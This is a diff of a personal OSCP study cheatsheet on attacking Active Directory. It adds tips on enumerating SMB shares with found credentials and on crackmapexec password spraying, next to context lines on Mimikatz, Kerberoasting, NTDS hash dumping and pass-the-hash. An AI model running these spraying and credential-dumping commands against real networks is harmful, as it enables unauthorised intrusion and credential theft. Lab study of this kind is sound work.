@@ -3,6 +3,7 @@ https://github.com/yovelo98/OSCP-Cheatsheet
 https://www.reddit.com/r/oscp/comments/1ew7nqt/order_of_attacking_ad_set/
 - enumerate the domain controller (Ldap!! services, DNS, Kerberos etc....)
 - MKW → Which is Running Mimikatz + Kerberoasting + Winpeas every time so that I do not miss any juicy vector.
+- With every domain creds gained, always enumerate share contents. do --shares with crackmapexec or try smbclient/smbmap
 - Get a foothold in the first host. Escalate privs. mimikatz and dump hashes. Pass the hash.  Or kerberoast.
 - Rinse and repeat with the creds / hashes to move from host to host until you get to the DC.
 
@@ -142,6 +143,7 @@ cme smb 10.10.0.202 -u username -p password --ntds vss
 # For Crackmapexec, try spray with and without --local-auth
 # protocols = smb, winrm, 
 # --continue-on-success to avoid stopping at the first valid credentials.
+# when spraying with cme, also remember to do domain (-d lab.local) and local (--local-auth)
 crackmapexec smb 192.168.50.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success
 crackmapexec <protocol> <target(s)> -u username1 -p password1 password2 --no-bruteforce
 crackmapexec <protocol> <target(s)> -u username1 username2 -p password1
